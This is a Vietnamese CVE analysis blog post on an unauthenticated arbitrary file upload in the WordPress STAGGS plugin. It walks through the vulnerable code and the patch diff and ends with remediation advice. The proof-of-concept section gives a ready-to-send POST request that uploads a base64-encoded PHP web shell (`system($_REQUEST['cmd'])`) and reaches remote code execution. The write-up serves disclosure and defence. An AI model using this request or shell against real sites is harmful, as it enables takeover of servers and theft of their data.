---
title: CVE-2025-47637 Analysis & POC
description: Security Vulnerability in WordPress STAGGS Plugin.
date: 2025-11-11 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, arbitrary file upload]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Lỗ hổng **Arbitrary File Upload** trong plugin **STAGGS** cho phép kẻ tấn công tải lên **Web Shell** lên máy chủ web, ảnh hưởng đến các phiên bản **STAGGS từ n/a đến 2.11.0**.

* **CVE ID**: [CVE-2025-47637](https://www.cve.org/CVERecord?id=CVE-2025-47637)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 2.11.0
* **Patched Versions**: 2.12.0
* **CVSS severity**: High (10)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress STAGGS Plugin](https://wordpress.org/plugins/staggs/)

## Requirements

* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **STAGGS**:  
    * `2.11.0` – **vulnerable**  
    * `2.12.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
Lỗ hổng xảy ra trong hàm `store_final_product_image()` thuộc file `/wp-content/plugins/staggs/includes/staggs-functions.php` do không xác thực **file type** trước khi upload

![Validate File Type](diff.png "Xác thực file type")

Bản vá đã sử dụng while list, chỉ chấp nhận các loại file: `png`,`jpg`,`jpeg`,`gif`

## Code Analysis

Plugin đã đăng ký một action hook dành cho người dùng chưa đăng nhập (`wp_ajax_nopriv_`):

```php {title="staggs-functions.php" hl_lines=[] data-open=true}
add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' );
```

Khi truy cập endpoint `/wp-admin/admin-ajax.php` với param `action=staggs_get_configuration_form_urls` thì callback `staggs_get_configuration_form_urls_ajax` được gọi

```php {title="staggs-functions.php" hl_lines=[3,10] data-open=true}
function staggs_get_configuration_form_urls_ajax() {
  $response = array();
  if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) {
    echo json_encode( $response );
    die();
  }
  ...
  if ( isset( $_POST['image_id'] ) ) {
    $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title.
    $image_url  = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true );

    $response['image_url'] = $image_url;
  }
  ...
  echo json_encode( $response );
  die();
}
```

Hàm này kiểm tra `nonce` từ request, nếu nó không tồn tại hoặc không hợp lệ thì trả về response rỗng 

> [!TIP]
> Khi tìm kiếm với từ khóa `sgg_ajax_nonce`, ta thấy `nonce` được tạo bằng key `AJAX_NONCE` và có comment `// image name based on product title.` liên quan đến product. Do phần này không yêu cầu xác thực, có thể đây là cơ chế phục vụ việc hiển thị product cho người dùng chưa đăng nhập, và `nonce` được chèn trực tiếp vào mã nguồn.
> Khi thử tính năng tạo product của plugin, hệ thống tạo một post mà người dùng chưa đăng nhập vẫn có thể truy cập.
> `nonce` này xuất hiện trong mã nguồn trả về khi truy cập product vừa được tạo.
> ![Nonce Create](nonce_create.png "Cách nonce được tạo")
> ![Create Product](product.png "Tạo Product bằng plugin")
> ![Nonce](nonce.png "Nonce lấy từ response")

Nếu `nonce` hợp lệ, tiếp tục kiểm tra `$_POST['image_id']` có tồn tại hay không, nếu có:
* Lấy `image name` tức tên của **product title** (theo mô tả: `// image name based on product title.`)
* Gọi `store_final_product_image()` để lưu ảnh và lấy URL trả về
* Trả về phản hồi JSON chứa `image_url`.

```php {title="staggs-functions.php" hl_lines=[2,28,33,35] data-open=true}
function store_final_product_image( $imagename, $data, $options, $main_image = true) {
  if ( preg_match( '/^data:image\/(.*);base64,/', $data, $type ) ) {
    // Valid base64 image.
    $data = substr( $data, strpos($data, ',') + 1 );
    $type = strtolower( $type[1] ); // jpg, png, gif

    $data = str_replace( ' ', '+', $data );
    $data = base64_decode($data);
  
    if ( $data === false ) {
      throw new \Exception('Image decode failed. Try again.');
    }
  } 
  ...
  $upload_dir = wp_get_upload_dir();
  $base_dir   = $upload_dir['basedir'];

  // Allow different location.
  $save_path  = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' );
  if ( ! file_exists( $save_path ) ) {
    mkdir( $save_path, 0777, true );
  }
  if ( $main_image ) {
    // Main product image.
    if ( is_array( $options ) && count( $options ) > 0 ) {
      $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type;
    } else {
      $filename = $imagename . '.' . $type;
    }
  } 
  ...
  // Always override in case something went wrong earlier
  file_put_contents( $save_path . "/{$filename}", $data );
  $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );
  return $image_path_url . "/{$filename}";
}
```

Lệnh:

```php
preg_match('/^data:image\/(.*);base64,/', $data, $type)
```

Dùng để kiểm tra xem biến `$data` có phải là chuỗi ảnh ở định dạng **Base64 Data URI** *hay không.*
Cụ thể:

* `^data:image\/` → chuỗi phải bắt đầu bằng `data:image/`
* `(.*)` → lấy phần định dạng ảnh (ví dụ: `png`, `jpeg`, `gif`, …)
* `;base64,` → tiếp theo phải có chuỗi `;base64,` (báo hiệu dữ liệu ảnh được mã hóa Base64)
* Nếu khớp, mảng `$type` sẽ chứa thông tin định dạng ảnh, ví dụ:

  ```php
  $type[1] = 'png';
  ```
* Nếu không khớp, tức `$data` **không phải là dữ liệu ảnh Base64 hợp lệ**, hàm trả về `0`.

Sau đó `$type` được gán giá trị của `$type[1]`

> [!BUG]
> Ta có thể truyền `$data=data:image/php;base64...` để `$type[1] ='php'`

```php
if ( is_array( $options ) && count( $options ) > 0 ) {
  $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type;
} else {
  $filename = $imagename . '.' . $type;
}
```

Nếu `$options` không được truyền thì `$filename` sẽ có dạng `product_title.$type`

Cuối cùng, file được lưu bằng hàm `file_put_contents()` và trả về URL đẫn tới nó

```php
file_put_contents( $save_path . "/{$filename}", $data );
$image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );
return $image_path_url . "/{$filename}";
```

## Flow
{{< mermaid >}}
graph TD
A["POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls"] --> B["staggs_get_configuration_form_urls_ajax()"]
B --> C{"wp_verify_nonce() valid?"}
C -- No --> Z["Return empty JSON"]
C -- Yes --> D{"isset($_POST['image_id'])?"}
D -- No --> Z
D -- Yes --> E["store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)"]
E --> F{"preg_match('/^data:image\/(.*);base64,/', $data, $type) ?" }
F -- No --> Z
F -- Yes --> G["$type = strtolower($type[1]); base64_decode($data)"]
G --> H["file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )"]
H --> I["Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Lấy nonce từ mã nguồn trả về
2. Gửi POST request

```php
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
action=staggs_get_configuration_form_urls&nonce=f281c84283&image_id=1&image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==
```

Với `PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==` mã hóa base64 của `<?php system($_REQUEST["cmd"]); ?>`

![Request](request.png "Request với Web Shell payload")

3. Truy cập URL trả về và RCE

![Result](result.png "RCE với file upload")

## Conclusion

Lỗ hổng cho phép **unauthenticated** kẻ tấn công tải lên file tùy ý (ví dụ web shell) thông qua endpoint AJAX của plugin STAGGS do thiếu xác thực kiểu file trước khi lưu. Kẻ tấn công có thể lấy `nonce` từ mã nguồn công khai, gửi `data:` URI giả mạo (vd. `data:image/php;base64,...`) và tạo file PHP trên máy chủ, dẫn tới RCE. Vấn đề đã được khắc phục trong phiên bản **2.12.0** bằng cách giới hạn phần mở rộng được chấp nhận (png, jpg, jpeg, gif).

## Key Takeaway

* Lỗ hổng bắt nguồn từ **không kiểm tra hợp lệ kiểu/đuôi file** trước khi lưu; kiểm tra client-side/regex không đủ nếu không ràng buộc phần mở rộng và nội dung thực tế.
* Không để endpoint quan trọng cho phép hành động upload chạy ở chế độ **nopriv (unauthenticated)** nếu không có cơ chế xác thực và hạn chế chặt.
* `nonce` chèn trong mã nguồn có thể bị thu thập và tái sử dụng — không dựa chỉ vào nonce hiển thị công khai để ngăn thao tác nhạy cảm.
* Cần validate cả **MIME type**, **phần mở rộng**, và (nếu có thể) kiểm tra nội dung thực tế của file trên server; lưu file upload ở vị trí không thể thực thi hoặc chuyển đổi thành non-executable.
* Cập nhật plugin lên **>= 2.12.0** ngay lập tức; kiểm tra site cho các file khả nghi trong thư mục upload `staggs/` nếu site chạy phiên bản cũ.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress STAGGS Plugin <= 2.11.0 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/staggs/vulnerability/wordpress-staggs-2-10-1-arbitrary-file-upload-vulnerability)  
